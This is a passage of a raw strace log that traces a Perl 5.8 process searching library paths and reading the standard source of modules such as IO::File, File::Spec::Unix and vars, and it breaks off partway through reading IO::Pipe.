6692  07:15:04.970823 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
6692  07:15:04.970838 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
6692  07:15:04.970931 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
6692  07:15:04.970949 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7dee000
6692  07:15:04.970964 mmap2(0xb7df1000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7df1000
6692  07:15:04.970980 close(8)          = 0
6692  07:15:04.971250 read(6, "", 4096) = 0
6692  07:15:04.971268 close(6)          = 0
6692  07:15:04.971302 stat64("/etc/perl/IO/File.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971318 stat64("/etc/perl/IO/File.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971333 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971346 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971361 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971374 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971394 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971406 stat64("/usr/lib/perl5/IO/File.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971420 stat64("/usr/share/perl5/IO/File.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971432 stat64("/usr/share/perl5/IO/File.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971446 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.971459 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
6692  07:15:04.971480 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
6692  07:15:04.971496 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe790e8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.971508 _llseek(6, 0, [0], SEEK_CUR) = 0
6692  07:15:04.971526 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
6692  07:15:04.971815 stat64("/etc/perl/File/Spec.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971833 stat64("/etc/perl/File/Spec.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971847 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971860 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971875 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971888 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971903 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971915 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971928 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971941 stat64("/usr/share/perl5/File/Spec.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971955 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971972 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971986 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.971999 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
6692  07:15:04.972021 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.972036 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.972047 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.972065 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
6692  07:15:04.972185 stat64("/etc/perl/vars.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972200 stat64("/etc/perl/vars.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972213 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972226 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972240 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972253 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972268 stat64("/usr/lib/perl5/vars.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972280 stat64("/usr/lib/perl5/vars.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972293 stat64("/usr/share/perl5/vars.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972305 stat64("/usr/share/perl5/vars.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972318 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972331 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfe7897c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972344 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfe78a6c) = -1 ENOENT (No such file or directory)
6692  07:15:04.972357 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
6692  07:15:04.972378 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
6692  07:15:04.972392 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78788) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.972403 _llseek(10, 0, [0], SEEK_CUR) = 0
6692  07:15:04.972420 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
6692  07:15:04.972536 stat64("/etc/perl/warnings/register.pmc", 0xbfe785bc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972551 stat64("/etc/perl/warnings/register.pm", 0xbfe784cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972565 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfe785bc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972579 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfe784cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972594 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfe785bc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972633 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfe784cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972651 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfe785bc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972679 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfe784cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972693 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfe785bc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972705 stat64("/usr/share/perl5/warnings/register.pm", 0xbfe784cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972720 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfe785bc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972733 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfe784cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972747 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfe785bc) = -1 ENOENT (No such file or directory)
6692  07:15:04.972761 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
6692  07:15:04.972783 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
6692  07:15:04.972798 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe782d8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.972810 _llseek(11, 0, [0], SEEK_CUR) = 0
6692  07:15:04.972829 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
6692  07:15:04.972978 read(11, "", 4096) = 0
6692  07:15:04.972991 close(11)         = 0
6692  07:15:04.973238 _llseek(10, 1148, [1148], SEEK_SET) = 0
6692  07:15:04.973255 _llseek(10, 0, [1148], SEEK_CUR) = 0
6692  07:15:04.973266 close(10)         = 0
6692  07:15:04.973335 _llseek(8, 594, [594], SEEK_SET) = 0
6692  07:15:04.973349 _llseek(8, 0, [594], SEEK_CUR) = 0
6692  07:15:04.973359 close(8)          = 0
6692  07:15:04.973392 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973408 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973422 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973436 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973458 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973471 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973486 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973499 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973513 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973525 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973539 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973553 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973567 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.973581 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
6692  07:15:04.973603 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.973649 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.973675 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.973694 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
6692  07:15:04.974361 brk(0x8218000)    = 0x8218000
6692  07:15:04.974494 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
6692  07:15:04.974938 read(8, "", 4096) = 0
6692  07:15:04.974953 close(8)          = 0
6692  07:15:04.975159 read(6, "", 4096) = 0
6692  07:15:04.975175 close(6)          = 0
6692  07:15:04.975344 stat64("/etc/perl/IO/Pipe.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975361 stat64("/etc/perl/IO/Pipe.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975376 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975389 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975404 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975417 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975431 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975443 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975457 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975469 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975482 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.975495 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
6692  07:15:04.975517 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
6692  07:15:04.975532 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe790e8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.975544 _llseek(6, 0, [0], SEEK_CUR) = 0
6692  07:15:04.975564 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq 